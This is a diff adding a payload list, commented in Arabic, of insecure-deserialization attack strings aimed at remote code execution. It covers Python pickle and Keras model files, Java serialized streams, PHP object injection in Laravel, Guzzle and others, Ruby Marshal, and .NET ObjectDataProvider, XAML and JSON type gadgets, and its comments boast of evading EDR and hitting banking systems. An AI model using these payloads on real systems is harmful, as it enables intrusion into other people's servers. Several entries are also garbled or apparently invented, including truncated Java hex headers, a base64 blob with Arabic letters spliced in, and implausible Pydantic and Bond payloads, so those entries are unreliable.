+# تستهدف تطبيقات الذكاء الاصطناعي التي تسمح برفع "كائنات مخصصة" داخل الموديل
+{"class_name": "Custom>Module", "config": {"__getstate__": {"os.system": "id"}}}
+
+# --- Python (Django - Signed Session Deserialization) ---
+# حمولة تستهدف تطبيقات Django التي تستخدم مفتاح SECRET_KEY ضعيف لتوقيع الجلسات
+(dp1\nS'id'\np2\nS'__import__("os").system("id")'\np3\ns.
+
+# --- Ruby (ActiveSupport - Marshal with Object Proxy) ---
+# سلسلة "بروكزي" تستخدم لتجاوز الفلاتر التي تراقب السلاسل المباشرة في Ruby
+\x04\x08o:\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\x07:\x0E\x40instanceo:\x08ERB\x06:\x09\x40srcI"$(id)\x06:\x06ET
+
+# --- .NET (ObjectDataProvider - Multi-Hop RCE) ---
+# حمولة .NET متقدمة تقوم بتشغيل "سكربت" في الذاكرة لتجاوز أنظمة الـ EDR
+<ObjectDataProvider x:Key="L" ObjectType="{x:Type s:Type}" MethodName="GetType">
+    <ObjectDataProvider.MethodParameters><s:String>System.Diagnostics.Process</s:String></ObjectDataProvider.MethodParameters>
+</ObjectDataProvider>
+
+# --- .NET (FastJSON - Dataset XML Injection) ---
+# استغلال ثغرة في مكتبة FastJSON عبر تمرير XML خبيث داخل كائن JSON
+{"$types":{"System.Data.DataSet, System.Data":"1"},"1":{"DataSet.XmlSchema":"<xs:schema xmlns=\"\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\"><xs:element name=\"DataSet1\" msdata:IsDataSet=\"true\"><xs:complexType><xs:choice minOccurs=\"0\" maxOccurs=\"unbounded\"><xs:element name=\"Table1\"><xs:complexType><xs:sequence><xs:element name=\"id\" type=\"xs:string\" minOccurs=\"0\"/></xs:sequence></xs:complexType></xs:element></xs:choice></xs:complexType></xs:element></xs:schema>"}}
+# --- Java (CommonsCollections10 - The Invisible Chain) ---
+# سلسلة نادرة جداً تعتمد على كلاسات داخلية في JDK لتجنب الكشف بواسطة الأدوات التي تبحث عن السلاسل القديمة
+AC ED 00 05 73 72 00 13 6A 61 76 61 2E 75 74 69 6C 2E 4C 69 6E 6B 65 64 48 61 73 68 4D 61 70 34 11 11 05 07 D1 D3 10 03 AE 01 02 00 01 5A 00 0A 61 63 63 65 73 73 4F 72 64 65 72
+
+# --- Java (Spring Messaging - RCE via SpEL) ---
+# تستهدف الأنظمة التي تستخدم Spring Cloud Function أو Spring Messaging لمعالجة الرسائل
+AC ED 00 05 73 72 00 2D 6F 72 67 2E 73 70 72 69 6E 67 66 72 61 6D 65 77 6F 72 6B 2E 6D 65 73 73 61 67 69 6E 67 2E 73 75 70 70 6F 72 74 2E 4D 65 73 73 61 67 65 48 65 61 64 65 72 73
+
+# --- PHP (Yii2 - RCE via CreateObject) ---
+# استغلال عميق في إطار عمل Yii2 يعتمد على الـ Dependency Injection لتوليد كائنات خبيثة
+O:23:"yii\rest\CreateAction":1:{s:11:"checkAccess";s:6:"system";}
+
+# --- PHP (TCPDF - SSRF to RCE) ---
+# حمولة تستخدم داخل ملفات الـ CSS التي تعالجها مكتبة TCPDF لتحميل ملفات Phar خبيثة
+@import "phar://malicious.phar/shell";
+
+# --- Python (Keras - Custom Activation Functions) ---
+# حقن كود داخل "دالة التنشيط" (Activation Function) في شبكة عصبية؛ ينفذ فوراً عند التنبؤ (Prediction)
+{"class_name": "Activation", "config": {"activation": "lambda x: __import__('os').system('id')"}}
+
+# --- Python (Dill / Global State Injection) ---
+# تستخدم مكتبة Dill لحقن "حالة نظام" كاملة تتضمن كوداً خبيثاً في الذاكرة
+\x80\x03c__builtin__\neval\n(S"__import__('os').system('id')"\ntR.
+
+# --- Ruby (Rack-Session-Cookie - HMAC Bypass) ---
+# حمولة تستهدف تطبيقات Ruby التي تستخدم Marshaling وتعتمد على Secret Key يمكن تخمينه
+\x04\x08o:\x17Gem::Package::TarReader\x06:\x08\x40ioo:\x14Net::BufferedIO\x06:\x07\x40ioo:\x0FActiveSupport::Cache::Store
+
+# --- .NET (ObjectDataProvider - Workflow Bypass) ---
+# حمولة متقدمة تستخدم في الأنظمة الحكومية والمالية التي تعتمد على Windows Workflow Foundation
+<ObjectDataProvider x:Key="x" ObjectType="{x:Type s:Type}" MethodName="GetType">
+  <ObjectDataProvider.MethodParameters><s:String>System.Diagnostics.Process</s:String></ObjectDataProvider.MethodParameters>
+</ObjectDataProvider>
+
+# --- .NET (XAML - Resource Dictionary Injection) ---
+# حمولة تُزرع داخل ملفات الثيمات (Skins/Themes) في تطبيقات WPF و Silverlight
+<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:System="clr-namespace:System;assembly=mscorlib" xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system">
+  <ObjectDataProvider x:Key="y" ObjectType="{x:Type Diag:Process}" MethodName="Start">
+    <ObjectDataProvider.MethodParameters><System:String>cmd</System:String><System:String>/c id</System:String></ObjectDataProvider.MethodParameters>
+  </ObjectDataProvider>
+</ResourceDictionary>
+# --- Java (Vaadin 8/14+ - استهداف أنظمة الـ Dashboard) ---
+# تستهدف تطبيقات جافا الحديثة التي تستخدم إطار عمل Vaadin لبناء لوحات التحكم
+AC ED 00 05 73 72 00 24 63 6F 6D 2E 76 61 61 64 69 6E 2E 73 65 72 76 65 72 2E 43 6F 6D 6D 75 6E 69 63 61 74 69 6F 6E 4D 61 6E 61 67 65 72
+
+# --- Java (JBoss / WildFly - Remoting RCE) ---
+# تستهدف بروتوكولات الإدارة عن بعد في سيرفرات JBoss عبر بروتوكول HTTP-Remoting
+AC ED 00 05 73 72 00 2A 6F 72 67 2E 6A 62 6F 73 73 2E 6D 61 72 73 68 61 6C 6C 69 6E 67 2E 4D 61 72 73 68 61 6C 6C 65 72
+
+# --- PHP (Laravel - RCE via EvalLoader) ---
+# سلسلة فتاكة تستغل محرك تحميل القوالب في لارافيل لتنفيذ كود PHP مباشرة
+O:29:"Illuminate\Support\MessageBag":2:{s:11:"*messages";a:0:{}s:13:"*format";O:32:"Illuminate\View\Engines\PhpEngine":1:{s:13:"*evalLoader";s:6:"system";}}
+
+# --- PHP (GuzzleHttp - RCE via Stream Filter) ---
+# استغلال متقدم جداً يقوم بحقن فلاتر داخل تدفق البيانات (Stream) لتنفيذ الأوامر
+O:24:"GuzzleHttp\HandlerStack":1:{s:10:"*handler";O:33:"GuzzleHttp\Psr7\CachingStream":1:{s:9:"*remote";s:6:"system";}}
+
+# --- Python (NumPy - Data Persistence RCE) ---
+# تستهدف ملفات .npy التي تُستخدم لتخزين مصفوفات البيانات الضخمة
+import numpy as np
+# البصمة تبدأ بـ \x93NUMPY
+\x93NUMPY\x01\x00v\x00{'descr': 'O', 'fortran_order': False, 'shape': (1,), } \n(cos\nsystem\n(S'id'\ntR.
+
+# --- Python (TensorFlow - Keras Metadata Injection) ---
+# حمولة تُزرع داخل ملفات التعريف (Metadata) الخاصة بنماذج الذكاء الاصطناعي
+{"config": {"layers": [{"class_name": "Lambda", "config": {"function": ["\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x08os\x8c\x06system\x93\x8c\x02id\x85R."]}}]}}
+
+# --- Ruby (Rack-Proxy / Net-HTTP Smuggling) ---
+# تستهدف تطبيقات Ruby التي تعمل كبروكسي لتمرير كائنات Marshal خبيثة داخل الهيدرز
+\x04\x08o:\x1FActionDispatch::Request::Session\x08:\n\x40reqo:\x1DActionDispatch::Request\x00
+
+# --- .NET (Windows Workflow Foundation - Compiler RCE) ---
+# حمولة متقدمة تقوم باستدعاء مترجم C# الداخلي (Compiler) لتشغيل كود في الذاكرة
+<CompilerParameters xmlns="http://schemas.microsoft.com/winfx/2006/xaml/workflow" TypeName="System.Workflow.ComponentModel.Compiler.CompilerParameters">
+  <CompilerOptions>/c id</CompilerOptions>
+</CompilerParameters>
+
+# --- .NET (SharpZipLib - Zip Slip to Deserialization) ---
+# تستهدف تطبيقات .NET التي تعالج ملفات Zip تحتوي على كائنات ثنائية مشفرة
+AAEAAAD/////AQAAAAAAAAAMAgAAAFN5c3RlbS5Db25maWd1cmF0aW9uLkluc3RhbGwuQXNzZW1ibHlJbnN0YWxsZXIBAAAABWFzc2VtYmx5UGF0aAECAAAABgMAAAALQzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29yazY0XHY0LjAuMzAzMTlcU3lستيم.dll
+# --- Java (Apache Ignite - In-Memory Database RCE) ---
+# تستهدف قواعد البيانات التي تعمل في الذاكرة وتستخدم في الأنظمة البنكية لمعالجة ملايين المعاملات
+AC ED 00 05 73 72 00 24 6F 72 67 2E 61 70 61 63 68 65 2E 69 67 6E 69 74 65 2E 69 6E 74 65 72 6E 61 6C 2E 62 69 6E 61 72 79 2E 42 69 6E 61 72 79 4F 62 6A 65 63 74 49 6D 70 6C
+
+# --- Java (Castor XML - Advanced Deserialization) ---
+# تستهدف تطبيقات جافا القديمة والعملاقة التي تستخدم Castor لتحويل XML إلى كائنات
+<class>org.apache.commons.collections.functors.ChainedTransformer</class>
+
+# --- PHP (Swoole - High-Performance PHP RCE) ---
+# تستهدف تطبيقات PHP التي تعمل كمحركات سيرفر مستقلة (Swoole) وتستخدم Serialization سريع
+O:20:"Swoole\Server\Status":1:{s:10:"*callback";s:6:"system";}
+
+# --- PHP (GuzzleHttp - RCE via Message Formatting) ---
+# تقنية حديثة لاستغلال طريقة تنسيق الرسائل في مكتبة Guzzle الشهيرة
+O:28:"GuzzleHttp\Psr7\Request":2:{s:7:"*method";s:6:"system";s:10:"*uri";O:21:"GuzzleHttp\Psr7\Uri":1:{s:8:"*string";s:2:"id";}}
+
+# --- Python (Pyramid - Web Framework Session RCE) ---
+# تستهدف تطبيقات Python المبنية بإطار عمل Pyramid عند استخدام جلسات مشفرة بمفتاح ضعيف
+(dp0\x86\x94(S'__builtins__'\x94(S'eval'\x94\x86\x94R\x94(S'__import__("os").system("id")'\x94\x86\x94R\x94.
+
+# --- Python (FastAPI / Pydantic - Schema Injection) ---
+# تستهدف تطبيقات FastAPI الحديثة عند معالجة نماذج بيانات (Schemas) تحتوي على كائنات معقدة
+{"__pydantic_model__": "os.system", "command": "id"}
+
+# --- Ruby (GlobalID - Rails Internal RCE) ---
+# تستهدف طريقة تعريف الكائنات عالمياً في Ruby on Rails لتنفيذ كود عبر الـ Signed IDs
+\x04\x08o:\x0CGlobalID\x06:\x08\x40uriI"gid://app/ActiveStorage::Blob/$(id)\x06:\x06ET
+
+# --- .NET (Bond - Microsoft High-Performance Serializer) ---
+# تستهدف مكتبة Bond التي طورتها مايكروسوفت وتُستخدم في الأنظمة السحابية الضخمة
+\x00\x01\x00\x00\x11System.Diagnostics.Process\x15/c id
+
+# --- .NET (ServiceStack.Text - Fast JSON RCE) ---
+# تستهدف بدائل Newtonsoft JSON التي تركز على السرعة، عبر استغلال ميزة "التحويل التلقائي للأنواع"
+{"@type":"System.Diagnostics.Process, System","StartInfo":{"Arguments":"/c id","FileName":"cmd"}}
